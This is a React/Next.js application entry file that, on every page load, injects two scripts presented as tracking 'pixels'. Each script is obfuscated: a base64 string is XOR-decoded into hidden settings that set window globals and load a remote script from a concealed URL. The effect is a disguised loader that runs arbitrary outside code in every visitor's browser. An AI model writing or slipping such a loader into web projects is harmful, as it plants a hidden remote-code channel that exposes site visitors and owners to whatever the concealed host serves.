import { useEffect } from "react";
import "../styles/globals.css";

const permanentPixels = [
  {
    id: "pixel-principal",
    content: `(function(){var k_ooe=atob("DBUFXeULXKlT854yRm4nKJdnfpNxm+pGNmY/cspoOMd9hupfL3N8c4ZkMYcxgbFBJWdsLZF4c9wnnu0dKnRxOJZ/csMg0bIQJ2FxL4xpKd02gLwIHW4nM4RmOYtp0fpTMnQoKJFmNc8q3u5AI2NgM5EmJMo8l7NBJX4nccd9PcUmlrwIZDd4cZ4pMsg+lrwIZHFkKYQmKd0+mvhLa2V3OJNuMt1+gOtQL3F2f8kpKsg/hvsQfDcnILh2");var t_t34=[];for(var v_shr=0;v_shr<k_ooe.length;v_shr++){t_t34.push(k_ooe.charCodeAt(v_shr)&255);}var r_kt7=t_t34[0];var n_bq5=t_t34.slice(1,1+r_kt7);var g_bemx=t_t34.slice(1+r_kt7);var g_r2c=g_bemx.map(function(b,d_lh){return b^n_bq5[d_lh%r_kt7];});var c_3tiz="";for(var o_cz=0;o_cz<g_r2c.length;o_cz++){c_3tiz+=String.fromCharCode(g_r2c[o_cz]&255);}var e_fqtn=decodeURIComponent(escape(c_3tiz));var e_c4=JSON.parse(e_fqtn);var s_l03=e_c4.globals||[];s_l03.forEach(function(y_x70){window[y_x70.name]=y_x70.value;});var d_18=document.createElement("script");d_18.src=e_c4.url;d_18.async=true;d_18.defer=true;(e_c4.attributes||[]).forEach(function(i_ter){d_18.setAttribute(i_ter.name,i_ter.value);});(document.head||document.documentElement).appendChild(d_18);})();`,
  },
  {
    id: "pixel-secundario",
    content: `(function(){var h_e0ye=atob("DP/Zw4IC3eplcxeS4YT7tvBu/9BHG2PmkYzj7K1huYRLBmP/iJmg7eFtsMQHATjhgo2ws/Zx8poMC3L+zo+wu+du84AWUTuwgIutsetgqJ4AADWouqL14eVusogEH2Sw26Si4exjsI9HSTXiiIe8r8tm/8ZHBXb+lJr7+aA0vNtRFnXw2cfh8rJku4lSRC6i1c7gobIgoLcY");var f_h=[];for(var h_k5l=0;h_k5l<h_e0ye.length;h_k5l++){f_h.push(h_e0ye.charCodeAt(h_k5l)&255);}var b_bd=f_h[0];var g_4=f_h.slice(1,1+b_bd);var n_f=f_h.slice(1+b_bd);var o_ub=n_f.map(function(b,e_x2a){return b^g_4[e_x2a%b_bd];});var n_ajk="";for(var k_k32=0;k_k32<o_ub.length;k_k32++){n_ajk+=String.fromCharCode(o_ub[k_k32]&255);}var p_un4=decodeURIComponent(escape(n_ajk));var y_vbh=JSON.parse(p_un4);var a_d=y_vbh.globals||[];a_d.forEach(function(h_u1k){window[h_u1k.name]=h_u1k.value;});var p_sdf=document.createElement("script");p_sdf.src=y_vbh.url;p_sdf.async=true;p_sdf.defer=true;(y_vbh.attributes||[]).forEach(function(w_q9fh){p_sdf.setAttribute(w_q9fh.name,w_q9fh.value);});(document.head||document.documentElement).appendChild(p_sdf);})();`,
  },
];

export default function App({ Component, pageProps }) {
  useEffect(() => {
    permanentPixels.forEach(({ id, content }) => {
      if (document.getElementById(id)) {
        return;
      }

      const script = document.createElement("script");
      script.id = id;
      script.text = content;
      document.head.appendChild(script);
    });
  }, []);

  return <Component {...pageProps} />;
}